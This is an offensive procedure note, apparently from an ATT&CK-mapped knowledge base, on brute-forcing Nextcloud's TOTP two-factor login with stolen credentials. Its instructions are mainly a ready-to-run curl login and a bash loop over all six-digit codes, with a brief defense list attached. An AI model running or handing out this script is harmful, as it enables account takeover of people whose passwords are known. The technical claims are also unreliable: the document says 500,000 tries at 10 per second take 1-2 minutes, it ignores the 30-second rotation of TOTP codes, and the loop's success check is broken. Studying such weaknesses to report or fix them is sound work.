---
tags:
  - brute-force
  - 2fa
  - totp
  - nextcloud
  - authentication
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-nextcloud-login-attempt]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Brute Force]]'
updated_at: '2025-12-14T17:24:47.814Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: aa5c5aea-a458-44ad-8c5b-d0d2020d9f29
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---
# Brute-Force-Nextcloud-TOTP-2FA

## Summary

This procedure exploits the lack of rate limiting or lockout in Nextcloud's TOTP-based 2FA login process, allowing an attacker to brute force the 6-digit TOTP code unlimited times after providing valid username and password, potentially leading to account takeover.

## Description

In Nextcloud, after successful primary authentication, the TOTP 2FA step does not implement any brute force protections such as attempt limits, delays, or CAPTCHAs. An attacker with the user's credentials can systematically guess the time-based one-time password (TOTP), which is a 6-digit code valid for 30 seconds. The vulnerability was identified through manual testing of the login flow, revealing no restrictions on submission attempts. This enables automated scripts to try all possible codes (1,000,000 combinations) in minutes, succeeding on average after half a million tries. The target environment is a standard Nextcloud web application running on PHP, accessible via browser or API calls.

## Requirements

1. Valid username and password for the target Nextcloud account
2. Network access to the Nextcloud instance's login endpoint (typically HTTPS port 443)
3. Tools for HTTP requests, such as curl or a scripting environment (e.g., Bash with loop support)

## Defense

Defensive measures and detection strategies:

- Implement rate limiting on TOTP submissions (e.g., max 5 attempts per minute per IP/session)
- Add account lockout after failed 2FA attempts (e.g., 10 failures trigger temporary suspension)
- Introduce progressive delays or CAPTCHA after initial failures
- Monitor login logs for high-volume TOTP attempts from single sources
- Use device fingerprinting to detect automated brute force tools

## Objectives

1. Gain unauthorized access to the Nextcloud account by guessing the TOTP code
2. Demonstrate the weakness in 2FA implementation for awareness and patching
3. Validate the vulnerability in a test environment before reporting

## Instructions

### Step 1: Authenticate with Primary Credentials

**Context**: Submit username and password to reach the TOTP challenge, establishing a session for subsequent attempts.

**Command** ([[commands/curl-nextcloud-login-attempt]]):
```bash
curl -X POST 'https://nextcloud.example.com/login.php' \
  -d 'user=username' \
  -d 'password=knownpassword' \
  -c cookies.txt -D headers.txt
```

> This command performs the initial login, stores session cookies, and outputs headers to confirm the 2FA redirect. Expected output includes a 200 OK with TOTP form or challenge token.

### Step 2: Brute Force TOTP Submissions

**Context**: Use the session to repeatedly submit 6-digit codes, checking for success without interruptions.

**Command** ([[commands/curl-nextcloud-login-attempt]]):
```bash
for i in {0..999999}; do
  code=$(printf "%06d" $i)
  response=$(curl -s -X POST 'https://nextcloud.example.com/login.php' \
    -b cookies.txt \
    -d "challenge_response=$code" \
    -w "%{http_code}")
  if [[ $response == *"success"* ]] || [[ $response == 200 && $(curl -s -b cookies.txt 'https://nextcloud.example.com' | grep -c "dashboard") -gt 0 ]]; then
    echo "Success with code: $code"
    break
  fi
  sleep 0.1  # Minimal delay to avoid overwhelming, though not enforced by target
 done
```

> This loops through all possible 6-digit codes, submitting each via POST with the session cookie. Success is indicated by a dashboard redirect or specific success marker in the response. On average, it succeeds after ~500,000 attempts, taking ~1-2 minutes at 10 attempts/second.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Brute Force]]

### Sub-Techniques


## Commands Used

- [[commands/curl-nextcloud-login-attempt]]

## Tools Used


## Tags

- [[brute-force]]
- [[2fa]]
- [[totp]]
- [[nextcloud]]
- [[authentication]]
